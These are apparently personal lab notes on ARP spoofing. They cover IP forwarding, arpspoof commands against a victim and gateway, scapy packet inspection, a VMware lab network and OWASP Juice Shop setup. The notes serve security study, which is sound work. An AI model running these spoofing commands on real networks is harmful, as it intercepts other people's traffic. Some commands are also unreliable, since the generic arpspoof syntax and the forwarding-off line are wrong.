<h3>ARP Spoof</h3>
<h4>First step process of On-path Attacks.</h4>
<img src="/assets/images/arp_spoof_diagram1.png" width="450" height="225">
<h4>Enable port forwarding (Linux)</h4>
<p>Check if port forwarding is already enabled: <br/>
cat /proc/sys/net/ipv4/ip_forward - should return 1, if 0 then enable.
</p>
<p>As the computer is not a router, this will allow packets to flow through it.</p>
<h4>:~# echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward  </h4>
<h3>There is some sort of bug where you need to reset this each time you test.</h3>
<p>When you are finished testing, turn port forwarding off as it is a security risk
<br/>
echo 0 /proc/sys/net/ipv4/ip_forward
</p>
<h4>First: Target (victim) machine.</h4>
<p><b>arpspoof -i</b> [<i>TARGET_IP</i>] <b>-t</b> [<i>GATEWAY_IP</i>] [<i>GATEWAY_IP</i>]</p>
<p><b>arpspoof -i <i>eth0</i> -t <i>192.168.63.174 192.168.63.2</i></b></p> 

<h4>Second: Router (GATEWAY) IP.
<p><b>arpspoof -i</b> [<i>GATEWAY_IP</i>] <b>-t</b> [<i>TARGET_IP</i>]</p>
arpspoof -i [interface] -t [Gateway IP] [target IP (interface)] 
<p><b>arpspoof -i <i>eth0</i> -t <i>192.168.1.254 192.168.1.72</i></b></p>
<img src="/assets/images/arp_spoof_diagram2.png" width="450" height="225">

<h4>Run network_scanner to return the target IP(s?)</h4>

<h4>Creating the ARP Request Packet</h4>

<p><b>print(packet.show())</b></p>
<img src="/assets/images/packet_show_results.png" width="300" height="300">
<br/>
<p><b></b></p>print(packet.summary())</b></p>
<img src="/assets/images/packet_summary_results.png" width="400" height="50">
<p>What this tells us: This is an ARP Packet. Of type "is at". It is telling the target this IP,
is at this MAC Address, which is the MAC Address of our eth0.
</p>



<br/><br/><br/><br/><br/><br/><br/><br/><br/>
<h3>VMWare Fusion Network:</h3>
<p>
In order to properly test ARP Spoof we need two separate VMs that can talk to each other:
</p>
<ol>
    <li>Ping each other.</li>
    <li>Reach the internet.</li>
    <li>Use a USB Wireless Adapter</li>
    <li>From the Hosts (& My MacOS), to be able to do things like;
        <ol>
            <li>SSH</li>
            <li>FTP: POST files to a VM or GET 
                them (eg, logs - filezilla):
            </li>
            <li>Access HTTP Servers on each machine, 
                from a browser that resides on the HOST.
            </li>
        </ol>
    </li>
</ol>


Client Machine	Interface	IPv4 Address	Subnet Mask	Slash Notation	Default Gateway
Mac Host	en0	192.168.1.123	255.255.255.00 	/24	192.168.1.254
KaliLinuxVM	eth0	192.168.1.72	255.255.255.00	/24	
ParronVM	ens33	192.168.63.176	255.255.255.00	/24	
Win10VM1	Ethernet0	169.254.210.65	255.255.00.00	/16	192.168.1.254
Win10VM2	Ethernet0	192.168.63.177	255.255.255.0	/24	192.168.63.2

We want to configure VMWare Fusion in NAT mode, also known as share mode.

Configure a super switch router on the HOST Mac.

<h2>ISSUE!</h2>
<h3>Found the reason for the **no internet** target machine</h3>
<p>Even if cat /proc/sys/net/ipv4/ip_forward returns 1.  IP Forwarding is, often, not enabled.</p>
<p>Need to manually reset ipforwarding when his occurs</p>
<h4>:~# echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward  </h4>

<h3>OWASP Juice Shop</h3>
Very good testing site as, it is http only, and it has a download page to test download interupts.
<h4>Ignore all directions on the website.  Use...</h4>
Sudo apt install juice-shop.
<br/>
<b>root@kali:~# sudo juice-shop -h</b>
<br/>
<h4>juice-shop</h4>
[*] Please wait for the Juice-shop service to start.
<br/>
[*]
<br/>
[*] You might need to refresh your browser once it opens.
<br/>
[*]
<br/>
[*]  Web UI: http://127.0.0.1:42000
<h4>stop juice-shop</h4>
root@kali:~# juice-shop-stop -h
<b>* juice-shop.service - juice-shop web application</b>
<br/>
     Loaded: loaded (/usr/lib/systemd/system/juice-shop.service; disabled; preset: disabled)
<br/>
     Active: inactive (dead)
<br/>



